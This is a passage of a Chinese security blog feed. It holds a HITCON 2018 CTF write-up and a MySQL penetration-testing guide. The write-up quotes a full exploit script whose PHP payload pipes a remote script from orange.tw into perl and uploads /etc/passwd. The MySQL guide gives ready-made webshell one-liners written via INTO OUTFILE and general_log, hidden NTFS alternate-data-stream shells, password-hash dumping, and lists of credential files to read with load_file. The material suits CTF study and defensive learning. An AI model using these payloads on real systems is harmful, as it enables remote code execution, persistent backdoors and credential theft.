K0rz3nuid=1000(K0rz3n) gid=33(www-data) groups=33(www-data)</code></pre><h4 id="3-ls-la"><a href="#3-ls-la" class="headerlink" title="3.ls -la"></a><strong>3.ls -la</strong></h4><p>这个命令能查看当前目录中所有文件的属主和属组，并且能根据最前面的 10个字符判断其他组的用户对当前文件所拥有的权限</p><pre><code class="hljs">root@8235174cc513:/var/www/html# ls -latotal 16drwxr-xr-x 2 root root 4096 Nov  7 06:23 .drwxr-xr-x 3 root root 4096 Nov  7 05:55 ..-rw-r--r-- 1 root root   32 Nov  7 06:23 index.php-rw-r--r-- 1 root root   29 Nov  7 06:23 qweasdzxc.php</code></pre><p><strong>解释一下两个 root</strong></p><p>其中这两个 root 的前一个表示这个文件属于 root 用户组，后一个表示这个文件属于 root 用户所有，连起来就是这个文件的归属为 root 用户组下面的 root 用户</p><p><strong>然后解释一下前面的10个字符</strong></p><p>(1)第一个字符表示这个文件的属性 是目录(d) 文件(-) 还是连接(l) 还是块设备(b) 等<br>(2)后面三个字符表示的是这个文件的拥有者(也就是两个 root 的后一个) <strong>对这个文件的操作权限</strong><br>(3)中间三个字符表示的是与这个文件的拥有者在同一个用户组的用户<strong>对这个文件的操作权限</strong><br>(4)最后三个字符表示的是其他用户组中的用户<strong>对这个文件的操作权限</strong></p><p>我为什么把“对这个文件的操作权限”几个字加粗，实际上我想表达的是，我们所谓的控制权限实质上就是改变文件的属组和属主，让他和想操作这个文件的用户所起的进程不是一个用户，不在一个属组，然后再对这个文件配置 755 或者 644 之类的权限，剥夺其他用户组的用户的修改权限或者执行权限，这样就达到了我们控制权限的目的</p><h2 id="0X02-如何控制-Shell-的权限"><a href="#0X02-如何控制-Shell-的权限" class="headerlink" title="0X02 如何控制 Shell 的权限"></a><strong>0X02 如何控制 Shell 的权限</strong></h2><p>上面说那么多关于权限的问题，我们还是回归到我们的 Shell 上面来，我们首先可以自己测试一下 Shell 的权限，使用 whoami ，我发现是 www-data 权限，查了一下资料，发现 php-fpm 似乎默认就是 www-data 的权限</p><p>然后如果我们的 web 目录的所属用户就是 www-data 的话，那就比较危险，但是往往不是这样的，我看了一下我的 web 目录的所属组合用户都是 root ，也就是说它和我们的 shell 的用户所在的用户组根本不一样 ，那我们只要控制好三个数字中的最后一个为 4 就比较安全了，然后我看了一下文件权限设置为 644  ，这样就完全不用设置。</p><p>但是如果真的你的 web 目录的所属用户和 Shell 所属的用户真的就是一个的话，那么一定要对 web 目录的文件的所属用户和用户组进行修改（毕竟我们没法改变 shell 的权限，我们只能选择修改 web 目录的权限），这里使用我上<a href="http://www.k0rz3n.com/2018/05/17/%E6%90%AD%E5%BB%BAdocker%E7%9A%84%20CTF%20getshell%E7%8E%AF%E5%A2%83/">一篇文章</a>的方法就好了。</p><h2 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a><strong>0X03 总结</strong></h2><p>对于权限问题，其实并没有相像的复杂，只要沉下心来稍微分析一下就很快能弄清楚啦，这篇文章也算是了了我的一个心愿。</p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘 shell Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于One-line-php-challenge的思考</title>
    <link href="/2018/10/24/%E5%85%B3%E4%BA%8EOne-line-php-challenge%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <url>/2018/10/24/%E5%85%B3%E4%BA%8EOne-line-php-challenge%E7%9A%84%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<p>原文首发于安全客：<a href="https://www.anquanke.com/post/id/162656">https://www.anquanke.com/post/id/162656</a></p><h2 id="0X01-前言："><a href="#0X01-前言：" class="headerlink" title="0X01 前言："></a><strong>0X01 前言：</strong></h2><p>hitcon 2018 过去了，作为一个 web 手 one-lin-php-challenge  这道题自然引起了我的很大的兴趣，后期看各路大师傅们的解题姿势，也都是之前说过的一些细小的知识，看看为什么没有利用起来</p><h2 id="0X02-题目介绍："><a href="#0X02-题目介绍：" class="headerlink" title="0X02 题目介绍："></a><strong>0X02 题目介绍：</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/one-line%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D.png" alt="此处输入图片的描述"></p><pre><code class="hljs">P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04</code></pre><p>不愧是 Orange 巨巨的题，真的惊了。</p><p>大概解释一下就是 我们要通过 get 方式传入一个 orange 参数，作为文件名，然后程序会将我们传入文件名的那个文件取出头6个字符和 <code>@&lt;?php</code> 比对，如果配对成功那么就会包含这个文件，否则就什么都不做</p><p>我们知道，这个比赛的 flag 开头是 hitcon 正好是6个字符，有没有关系呢？我们接着往下看 </p><span id="more"></span><h2 id="0X03-解题过程"><a href="#0X03-解题过程" class="headerlink" title="0X03 解题过程"></a><strong>0X03 解题过程</strong></h2><h3 id="第一步：实现-session-文件的创建"><a href="#第一步：实现-session-文件的创建" class="headerlink" title="第一步：实现 session 文件的创建"></a><strong>第一步：实现 session 文件的创建</strong></h3><p>根据 Orange 给出的<a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">解题思路</a>，我们首先要通过 PHP_SESSION_UPLOAD_PROGRESS 控制 session 文件（ 而且从官方文档我们能发现session_upload_progress.cleanup&#x2F;enable是<strong>默认开启</strong>的 ，并且官方强烈推荐我们打开）</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Progress%20enable%20default.png" alt="此处输入图片的描述"></p><p>这一部分内容网上的很多文章也分析过了我就不重复分析了，但是这里却有一点不一样，人们根本没有向这个方向去想，因为这里面有一个误区，我们以前认为只有PHP使用了 session_start() 才会生成 session 文件，但是实际上并不是这样的</p><p><strong>我们来看我下面的实验：</strong></p><p>我在没有打开 session 的情况下，测试一段上传文件的代码，代码如下</p><p><strong>tt.php</strong></p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&lt;?php echo ini_get(&#39;session.upload_progress.name&#39;);?&gt; value=&quot;K0rz3n&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; value = &quot;&quot;/&gt; &lt;input type=&quot;submit&quot; name = &quot;submit&quot; value = &quot;upload&quot;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>upload.php</strong></p><pre><code class="hljs">&lt;?phpif($_POST[&#39;submit&#39;])&#123;$raw_name1 = $_FILES[&#39;file&#39;][&#39;name&#39;];$temp_file1 = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];move_uploaded_file($temp_file1, &#39;./Uploads/&#39;.$raw_name1);&#125;?&gt;</code></pre><p><strong>实验一：无PHPSESSID的情况</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0PHPSESSID.gif" alt="此处输入图片的描述"></p><p><strong>实验二：有PHPSESSID的情况</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%9C%89PHPSESSID.gif" alt="此处输入图片的描述"></p><p><strong>实验三：只有PHPSESSID的情况</strong></p><p>这次实验中我修改了 tt.php 中的部分内容，他看起来是下面的样子</p><pre><code class="hljs">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;./upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; value = &quot;&quot;/&gt; &lt;input type=&quot;submit&quot; name = &quot;submit&quot; value = &quot;upload&quot;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>我将不让 POST 请求中带有我们的 session.upload_progress.name </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%97%A0session.upload_processa.name.gif" alt="此处输入图片的描述"></p><p>我们发现，如果我们的请求头中带着 session.upload_progress.name 的值，不管服务端PHP有没有开session ，<br>只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个 PHPSESSID 在session 文件的默认存放位置生成一个 session 文件</p><h3 id="第二步：再分析已知条件"><a href="#第二步：再分析已知条件" class="headerlink" title="第二步：再分析已知条件"></a><strong>第二步：再分析已知条件</strong></h3><p>好了，到现在为止我们再回过头看题目，根据我们上面的分析，是不是我们只要想题目页面一边 POST 数据，然后再一边 GET 请求 这个 session 文件就行了呢？我们发现事情并没有我们想的那么简单，我们发现 Orange 给我们做了一个非常苛刻的限制，这其实也是这道题的第二个难点，他要求文件的开头必须是 <code>@&lt;?php</code> ，这不是搞笑吗？那让我们来看一下这个 session 文件的内容（参见 session.upload_progress 文件包含的文章），他是长得下面这个样子</p><pre><code class="hljs">upload_progress_K0rz3n|a:5:&#123;s:10:&quot;start_time&quot;;i:1540314711;s:14:&quot;content_length&quot;;i:764161;s:15:&quot;bytes_processed&quot;;i:5302;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:&#123;i:0;a:7:&#123;s:10:&quot;field_name&quot;;s:6:&quot;submit&quot;;s:4:&quot;name&quot;;s:7:&quot;tmp.gif&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1540314711;s:15:&quot;bytes_processed&quot;;i:5302;&#125;&#125;&#125;</code></pre><p>可以看到这个文件是以 upload_progress_ 开头的,也就是说，我们包含还不能直接包含，我们还需要控制这个开头，但是最多控制这18个字符，如果超过了就会影响到我们的 payload ，导致 shell 无法创建</p><h3 id="第三步：找到解决办法"><a href="#第三步：找到解决办法" class="headerlink" title="第三步：找到解决办法"></a><strong>第三步：找到解决办法</strong></h3><p>这里又不得不提到 P 总，P 总在 2016 年的时候在博客提到过一个知识点，利用 PHP 的过滤器实现 绕过 死亡 <code>&lt;?php exit;?&gt;</code> 是对三个白帽的一道题的分析 </p><p>我们先简单的回顾一下</p><p>题目内容是这样的：</p><pre><code class="hljs">&lt;?php$content = &#39;&lt;?php exit; ?&gt;&#39;;$content .= $_POST[&#39;txt&#39;];file_put_contents($_POST[&#39;filename&#39;], $content);</code></pre><p>大致意思是，我们可以在服务器上写文件，但是代码设置为只要我们传入文件的内容，他就给我们在开头添加上 <code>&lt;?php exit;?&gt;</code>，众所周知，这段代码的意思就是我们直接退出，不继续执行，因此就算我们传入了一句话，也会因为开头的这个退出指令导致我们无法包含，于是我们就要想办法绕过这个 “死亡” exit</p><p>P 总在文中给出了两种方法，一种是通过 php:&#x2F;&#x2F;filter 的 base64-decode 过滤器实现的，我们先简单看一下这个方法</p><h4 id="方法一：convert-base64-decode"><a href="#方法一：convert-base64-decode" class="headerlink" title="方法一：convert.base64-decode"></a><strong>方法一：convert.base64-decode</strong></h4><p>这种方法涉及到了 php 进行 base64 解码的一种机制，他在解码的时候遇到不符合 base64 规定字符的就会将其忽略，实际上他的解码过程是这样的</p><pre><code class="hljs">&lt;?php$_GET[&#39;txt&#39;] = preg_replace(&#39;|[^a-z0-9A-Z+/]|s&#39;, &#39;&#39;, $_GET[&#39;txt&#39;]);base64_decode($_GET[&#39;txt&#39;]);</code></pre><p>因此如果我们解码 <code>&lt;?php exit; ?&gt;</code> ，在排除掉 &lt; 、&gt; 、? 、；、空格以后，真正参与解码的只有 phpexit 这七个字符，又因为，base64 解码是 4byte 一组，于是我们给他添加一个字符让他凑够 8 </p><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php echo base64_decode($_POST[&#39;b64&#39;]);</code></pre><p><strong>实验截图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/b64%E8%A7%A3%E7%A0%81.png" alt="此处输入图片的描述"></p><p>那么现在只剩下这几个字符了，如果再解码一次估计就没剩什么了，自然我们就逃脱了 “死亡” exit</p><p>当然，我们能利用的不只是 base64 这一种过滤器，还有个过滤器叫 string.strip_tags,正如其名，他是用来去除 标签的</p><h4 id="方法二：string-strip-tags"><a href="#方法二：string-strip-tags" class="headerlink" title="方法二：string.strip_tags"></a><strong>方法二：string.strip_tags</strong></h4><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php echo strip_tags($_POST[&#39;tags&#39;]);</code></pre><p><strong>实验截图:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/strip_tags.png" alt="此处输入图片的描述"></p><p>这里不是我没运行，而是他已经把所有的标签连同里面内容全都删除了</p><p>但是如果是就这道 死亡 exit 来讲，这种方法也会将我们输入的shell 删除，解决办法就是使用过滤链，先将我们的 shell b64编码,然后经过 strip_tags 把 exit 去掉，然后在经过 b64 解码就 OK 了 ，具体的分析可以看 p总的<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">这篇文章</a></p><h3 id="第四步：问题解决"><a href="#第四步：问题解决" class="headerlink" title="第四步：问题解决"></a><strong>第四步：问题解决</strong></h3><p>经过上面的分析有没有觉得有了思路了呢？因为 Orange 这道题也是让我们逃逸,只不过不是 exit 而是 upload_progress_ 因为这个没有标签，于是 strip_tags 就不是很好用了，我们再看看 b64 的方法行不行<br>，因为 upload_progress_ 是16个字符，但是根据 b64 的 decode 规则，其中只有14个字符能解析，但是 14个字符又不是 4 的整数倍，于是我们必须添加两个字符，将其变成16位，那么加什么字符合适呢？</p><p>这里面其实是有讲究的，必须要保证在加了这个字符以后每次 b64 可解码的位数都是4 的整数倍，要不然就会吞掉我们的 payload 想必是经历了一番 fuzz 找到了 ZZ 这两个字符 </p><p>下面借用 wonderkun 师傅的脚本</p><pre><code class="hljs">&lt;?php$i = 0 ;$data = &quot;upload_progress_ZZ&quot;;while(true)&#123;    $i += 1;    $data = base64_decode($data);     var_dump($data);    sleep(1);    if($data == &#39;&#39;)&#123;        echo &quot;一共解码了:&quot;.$i,&quot;次\n&quot;;        break;    &#125;&#125;</code></pre><p>所以我们的 payload 是下面这段代码的输出结果</p><pre><code class="hljs">&lt;?phpecho &quot;upload_progress_ZZ&quot;.base64_encode(base64_encode(base64_encode(&#39;@&lt;?php eval($_GET[1]);&#39;)));</code></pre><p>也就是</p><pre><code class="hljs">upload_progress_ZZVVVSM0wyTkhhSGRKUjFZeVdWZDNiMHBHT1VoU1ZsSmlUVll3Y0U5M1BUMD0=</code></pre><p>我们亲自将去解码三次进行测试</p><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php$data = &#39;upload_progress_ZZVVVSM0wyTkhhSGRKUjFZeVdWZDNiMHBHT1VoU1ZsSmlUVll3Y0U5M1BUMD0=&#39;;for($i=0;$i&lt;3;$i++)&#123;$new_data = base64_decode($data).&quot;&lt;br/&gt;&quot;;echo $new_data;$data = $new_data;&#125;</code></pre><p><strong>输出结果：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C1.png" alt="此处输入图片的描述"></p><p>有一部分被解析了，我们看一下源码</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E4%B8%89%E6%AC%A1%E8%A7%A3%E7%A0%81%E7%BB%93%E6%9E%9C2.png" alt="此处输入图片的描述"></p><p>可以看到我们成功恢复了我们的payload (<br>前面是上一次循环的，第三次循环只剩下了题目要求的字符)</p><p>下面给上 Orange 的 exp</p><pre><code class="hljs">import sysimport stringimport requestsfrom base64 import b64encodefrom random import sample, randintfrom multiprocessing.dummy import Pool as ThreadPool   HOST = &#39;http://54.250.246.238/&#39;sess_name = &#39;iamorange&#39; headers = &#123;    &#39;Connection&#39;: &#39;close&#39;,     &#39;Cookie&#39;: &#39;PHPSESSID=&#39; + sess_name&#125; payload = &#39;@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;&#39;  while 1:    junk = &#39;&#39;.join(sample(string.ascii_letters, randint(8, 16)))    x = b64encode(payload + junk)    xx = b64encode(b64encode(payload + junk))    xxx = b64encode(b64encode(b64encode(payload + junk)))    if &#39;=&#39; not in x and &#39;=&#39; not in xx and &#39;=&#39; not in xxx:        print xxx        break def runner1(i):    data = &#123;        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;ZZ&#39; + xxx + &#39;Z&#39;    &#125;    while 1:        fp = open(&#39;/etc/passwd&#39;, &#39;rb&#39;)        r = requests.post(HOST, files=&#123;&#39;f&#39;: fp&#125;, data=data, headers=headers)        fp.close() def runner2(i):    filename = &#39;/var/lib/php/sessions/sess_&#39; + sess_name    filename = &#39;php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s&#39; % filename    # print filename    while 1:        url = &#39;%s?orange=%s&#39; % (HOST, filename)        r = requests.get(url, headers=headers)        c = r.content        if c and &#39;orange&#39; not in c:            print if sys.argv[1] == &#39;1&#39;:    runner = runner1else:    runner = runner2 pool = ThreadPool(32)result = pool.map_async( runner, range(32) ).get(0xffff)</code></pre><h2 id="0X04-总结："><a href="#0X04-总结：" class="headerlink" title="0X04 总结："></a><strong>0X04 总结：</strong></h2><p>这篇文章简单的跟着 Orange 的提供的思路走了一遍题目的流程，没有新的技术，但是更多的是技术的细节，session.upload_progress 这个小细节之前我也没有想到过，很多的细节就在想当然中过去了，如果你深入挖掘一下，可能会有不一样的收获</p><h2 id="0X05-参考："><a href="#0X05-参考：" class="headerlink" title="0X05 参考："></a><strong>0X05 参考：</strong></h2><p><a href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge">https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 CTF 渗透测试 PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql 在渗透测试中的利用</title>
    <link href="/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <url>/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="一、渗透中可利用的-mysql-的点"><a href="#一、渗透中可利用的-mysql-的点" class="headerlink" title="一、渗透中可利用的 mysql 的点"></a><strong>一、渗透中可利用的 mysql 的点</strong></h2><h3 id="1-写-webshell"><a href="#1-写-webshell" class="headerlink" title="1.写 webshell"></a><strong>1.写 webshell</strong></h3><h4 id="1-select-into-outfile-要有-root-权限"><a href="#1-select-into-outfile-要有-root-权限" class="headerlink" title="1.select into outfile(要有 root 权限)"></a><strong>1.select into outfile(要有 root 权限)</strong></h4><p>这个利用方式必须要是 root 登录权限，使用 select xxx ito outfile xxx 的形式，这个语句原来是用于快速导出某个表中的数据，或者整个表的，现在我们将我们的n 查询语句导出为 PHP 文件到 web 目录下</p><pre><code class="hljs">Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;E:\phpstudy\PHPTutorial\WWW\123123.php&#39;;</code></pre><p>但是使用这个语句的时候可能会出现几个问题：</p><p>(1)权限不够，我刚刚说过了，这个语句的使用必须是 root 权限,如果你非要尝试那只能得到下面的结果:</p><pre><code class="hljs">Access denied for user &#39;test&#39;@&#39;localhost&#39; (using password: YES)</code></pre><p>(2)受到 secure_file_priv 的限制，这个参数可以使用 mysql 命令行查询，查询语句如下：</p><pre><code class="hljs">show variables like &#39;%secure%&#39;;</code></pre><span id="more"></span><p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><pre><code class="hljs">ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</code></pre><p><strong>补充：</strong></p><p>这个命令本身就是导出表的，我们创建表当然可以</p><pre><code class="hljs">CREATE TABLE `mysql`.`K0rz3n` (`K0rz3n1` TEXT NOT NULL ); INSERT INTO `mysql`.`K0rz3n` (`K0rz3n1` ) VALUES (&#39;&lt;?php @eval($_POST [pass]);?&gt;&#39;); SELECT `K0rz3n1` FROM `K0rz3n` INTO OUTFILE &#39;d:/www/exehack.php&#39;; DROP TABLE IF EXISTS `K0rz3n`;</code></pre><h4 id="2-使用-general-log-写-shell-需要-sql-root-权限"><a href="#2-使用-general-log-写-shell-需要-sql-root-权限" class="headerlink" title="2.使用 general_log 写 shell(需要 sql root 权限)"></a><strong>2.使用 general_log 写 shell(需要 sql root 权限)</strong></h4><p>上面说了，直接导出数据容易受到 secure_file_priv 的限制，那么这个时候怎么办？这种情况下可以通过general_log和general_log_file来获取webshell</p><p>mysql打开general log之后，所有的查询语句都可以在general log文件中以可读的方式得到，但是这样general log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，**在每一次更改general log file的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。**如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。</p><p><strong>我们先来看一下我的默认的配置</strong></p><pre><code class="hljs">mysql&gt; show variables like &quot;%general%&quot;;+------------------+--------------------------------------------------------+| Variable_name    | Value                                                  |+------------------+--------------------------------------------------------+| general_log      | OFF                                                    || general_log_file | E:\phpstudy\PHPTutorial\MySQL\data\DESKTOP-S2L4C24.log |+------------------+--------------------------------------------------------+2 rows in set (0.00 sec)</code></pre><p>可以看到，general_log 的确默认是关闭的，文件的位置是 一个明确的日志文件，不过没关系我们是 root 权限的话，这些不都是在我们的掌控之中?</p><p><strong>改一波，走你！</strong></p><pre><code class="hljs">set global general_log=&#39;on&#39;;SET global general_log_file=&#39;E:/phpstudy/PHPTutorial/WWW/cmd.php&#39;;SELECT &#39;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code></pre><p><strong>再看一下配置：</strong></p><pre><code class="hljs">mysql&gt; show variables like &quot;%general%&quot;;+------------------+-------------------------------------+| Variable_name    | Value                               |+------------------+-------------------------------------+| general_log      | ON                                  || general_log_file | E:/phpstudy/PHPTutorial/WWW/cmd.php |+------------------+-------------------------------------+2 rows in set (0.00 sec)</code></pre><p>再看一下 cmd.php 是不是真的存在</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99%20shell.png" alt="此处输入图片的描述"></p><p>接下来我们愉快的访问就行了</p><h4 id="3-使用-echo-命令直接写-shell-基于UDF-提权"><a href="#3-使用-echo-命令直接写-shell-基于UDF-提权" class="headerlink" title="3.使用 echo 命令直接写 shell(基于UDF 提权)"></a><strong>3.使用 echo 命令直接写 shell(基于UDF 提权)</strong></h4><p>这种情况是在能执行系统命令的时候采用的</p><pre><code class="hljs">echo ^&lt;?php @eval(request[xxx])? ^^&gt;^ &gt;c:\web\www\shell.php</code></pre><p>win 下面能直接这样写，其中 ^ 的是为了转义 &lt; 字符</p><p><strong>这个命令能在 UDF 提权以后成功执行，创建 webshell</strong></p><h4 id="4-隐藏webshell-配合-echo-写-shell"><a href="#4-隐藏webshell-配合-echo-写-shell" class="headerlink" title="4.隐藏webshell(配合 echo 写 shell)"></a><strong>4.隐藏webshell(配合 echo 写 shell)</strong></h4><p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</p><pre><code class="hljs">echo ^&lt;?php @eval(request[xxx])? ^&gt;&gt; index.php:a.jpg</code></pre><p>这样子就生成了一个不可见的shell a.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个a.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，这样子就可以正常解析我们的一句话了。</p><h4 id="5-将一句话作为数据表的字段-配合文件包含"><a href="#5-将一句话作为数据表的字段-配合文件包含" class="headerlink" title="5.将一句话作为数据表的字段(配合文件包含)"></a><strong>5.将一句话作为数据表的字段(配合文件包含)</strong></h4><p>如果我们有创建表的权限，我们完全可以将表的某个字段写成一个一句话，然后我们找到这个表对应的文件包含之</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99%20shell.png" alt="此处输入图片的描述"></p><p>我们知道数据库的一起都是以文件的形式存在的，我们来找一下这个文件</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5shell.png" alt="此处输入图片的描述"></p><h4 id="6-一些补充："><a href="#6-一些补充：" class="headerlink" title="6.一些补充："></a><strong>6.一些补充：</strong></h4><p>Test.php 文件内容为 <code>&lt;?php phpinfo();?&gt;</code></p><pre><code class="hljs">Test.php:a.jpg     会生成Test.php  文件内容为空Test.php::$DATA  生成test.php  文件内容为&lt;?php phpinfo();?&gt;Test.php::$INDEX_ALLOCATION  生成test.php文件夹Test.php::$DATA\0.jpg  生成0.jpg  文件内容为&lt;?php phpinfo();?&gt;Test.php::$DATA\aaa.jpg  生成aaa.jpg  文件内容为&lt;?php phpinfo();?&gt;</code></pre><h3 id="2-直接查询用户的密码"><a href="#2-直接查询用户的密码" class="headerlink" title="2.直接查询用户的密码"></a><strong>2.直接查询用户的密码</strong></h3><p>这方法同样需要 root 权限</p><pre><code class="hljs">select user,password from mysql.user；</code></pre><p>然后你会看到一堆乱七八糟的字符，下面说一下 mysql 对密码的加密方式</p><pre><code class="hljs">password_str = concat(‘*’, sha1(unhex(sha1(password))))</code></pre><h3 id="3-load-file-使用注意："><a href="#3-load-file-使用注意：" class="headerlink" title="3.load_file()使用注意："></a><strong>3.load_file()使用注意：</strong></h3><p>load_file() 的作用是读取文件的内容，并将文件内容以字符串的形式返回，这个函数在渗透的过程中尤其的好用，但是这个函数的使用依然受到权限的限制以及 secure_file_Priv 的限制</p><pre><code class="hljs">select load_file(&quot;文件路径&quot;)；</code></pre><h4 id="1-win-下常见的敏感文件："><a href="#1-win-下常见的敏感文件：" class="headerlink" title="(1)win 下常见的敏感文件："></a><strong>(1)win 下常见的敏感文件：</strong></h4><pre><code class="hljs">c:/boot.ini //查看系统版本 c:/windows/php.ini //php配置信息 c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 c:/winnt/php.ini c:/winnt/my.ini c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 c:\Program Files\Serv-U\ServUDaemon.ini c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 c:\Program Files\RhinoSoft.com\ServUDaemon.exe C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 //存储了pcAnywhere的登陆密码 c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 d:\APACHE\Apache2\conf\httpd.conf C:\Program Files\mysql\my.ini C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</code></pre><h4 id="2-Linux-下常见的敏感文件"><a href="#2-Linux-下常见的敏感文件" class="headerlink" title="(2)Linux 下常见的敏感文件"></a><strong>(2)Linux 下常见的敏感文件</strong></h4><pre><code class="hljs">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 /usr/local/apache2/conf/httpd.conf /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /usr/local/app/php5/lib/php.ini //PHP相关设置 /etc/sysconfig/iptables //从中得到防火墙规则策略 /etc/httpd/conf/httpd.conf // apache配置文件 /etc/rsyncd.conf //同步程序配置文件 /etc/my.cnf //mysql的配置文件 /etc/redhat-release //系统版本 /etc/issue /etc/issue.net /usr/local/app/php5/lib/php.ini //PHP相关设置 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 /usr/local/resin-pro-3.0.22/conf/resin.conf 同上 /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 /etc/sysconfig/iptables 查看防火墙策略 load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 replace(load_file(0×2F6574632F706173737764),0×3c,0×20) 